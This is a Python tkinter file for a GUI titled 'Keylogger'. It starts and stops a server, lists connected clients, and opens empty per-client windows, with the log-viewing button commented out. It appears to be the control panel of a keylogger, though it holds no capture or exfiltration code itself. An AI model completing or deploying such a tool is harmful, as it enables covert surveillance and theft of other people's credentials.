import tkinter as tk
from tkinter import ttk
import threading
import server
import cv2
from PIL import Image, ImageTk
import numpy as np

selected_client = None

# Function to start the server.
def start_server():
    global server_thread
    server_thread = threading.Thread(target=server.start_server, args=(update_clients_list,))
    server_thread.start()


# Function to close the server.
def close_server():
    server.stop_server()

# Function to update the list of connected clients.
def update_clients_list(clients):
    for widget in clients_frame.winfo_children():
        widget.destroy()
    for client in clients:
        client_frame = tk.Frame(clients_frame, bg="#333333")
        client_label = tk.Label(client_frame, text=f"{client[0]}:{client[1]}", bg="#333333", fg="#ffffff", font=('Helvetica', 12))
        connect_button = ttk.Button(client_frame, text="Connect", command=lambda c=client: open_client_window(c))
        client_label.pack(side=tk.LEFT, padx=5)
        connect_button.pack(side=tk.RIGHT, padx=5)
        client_frame.pack(fill=tk.X, pady=5)

# Function to open a new window for the selected client.
def open_client_window(client):
    client_window = tk.Toplevel(root)
    client_window.title(f"Client {client[0]}:{client[1]}")
    client_window.geometry("640x480")
    client_window.configure(bg="#222222")

    # start_button = ttk.Button(client_window, text="See logs", command=lambda: start_stream(client, canvas))
    # start_button.pack(pady=10)

    end_button = ttk.Button(client_window, text="Back", command=client_window.destroy)
    end_button.pack(pady=10)

    canvas = tk.Canvas(client_window, width=640, height=480, bg="#222222")
    canvas.pack(pady=10)

# Create the GUI.
root = tk.Tk()
root.title("Keylogger")
root.geometry("400x400")  # Set the window size

# Apply dark theme
style = ttk.Style()
style.theme_use('clam')
style.configure("TButton", background="#333333", foreground="#ffffff", padding=10, font=('Helvetica', 12))
style.configure("TLabel", background="#333333", foreground="#ffffff", font=('Helvetica', 12))
style.configure("TListbox", background="#333333", foreground="#ffffff", font=('Helvetica', 12))

root.configure(bg="#222222")

start_server_button = ttk.Button(root, text="Start Server", command=start_server)
start_server_button.pack(pady=10)

close_server_button = ttk.Button(root, text="Close Server", command=close_server)
close_server_button.pack(pady=10)

clients_label = ttk.Label(root, text="Connected Clients:")
clients_label.pack(pady=10)

clients_frame = tk.Frame(root, bg="#222222")
clients_frame.pack(pady=10, fill=tk.BOTH, expand=True)

root.mainloop()